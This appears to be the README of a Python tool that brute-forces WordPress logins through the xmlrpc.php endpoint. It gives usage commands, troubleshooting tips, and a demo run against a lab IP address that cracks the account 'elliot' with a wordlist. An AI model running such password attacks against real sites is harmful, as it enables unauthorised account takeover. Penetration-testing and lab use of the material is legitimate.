<p align="center"><img src="https://i.imgur.com/K4aUmMo.png"></p>

<h4 align="center">An XMLRPC BruteForcer for Wordpress  - Inpired by (1N3@CrowdShield)</h4>

<p align="center">
  <a href="https://twitter.com/kavishgour"><b>Twitter</b></a>
  <span> - </span>
  <a href="https://t.me/kavishgr"><b>Telegram</b></a>
  <span> - </span>
  <a href="https://kavishgr.github.io"><b>Blog</b></a>
</p>


## Usage

```bash
python3 xmlrcpbruteforce.py http://wordpress.org/xmlrpc.php passwords.txt username
python3 xmlrpcbruteforce.py http://wordpress.org/xmlrpc.php passwords.txt userlist.txt ( >>in progess<<)
```
## Bugs

If you get an ```xml.etree.ElementTree.ParseError```:

* Did you forget to add 'xmlrpc' in the url ?
* Try to add or remove 'https' or 'www'.

## TODO

* Exception Handling for xml.etree.ElementTree.ParseError
* 'userlist' enumeration

## Demo

```bash
MacBook-Pro: kavish$ python3 xmlrpcbruteforce.py http://192.168.100.34/xmlrpc.php 10k-most-common.txt elliot

---------------Examining Target--------------------

[>] Target is vulnerable.

--=[Target: http://192.168.100.34/xmlrpc.php]=--

        	[...Bruteforcing...]
--=[Tried: 1000 passwords]=--
--=[Tried: 2000 passwords]=--
--=[Tried: 3000 passwords]=--
--------------- BRUTEFORCE SUCCESSFULL  ---------------
--=[User found]=--
Login: elliot
Password: ER28-0652
--=[Exiting...]=--
```

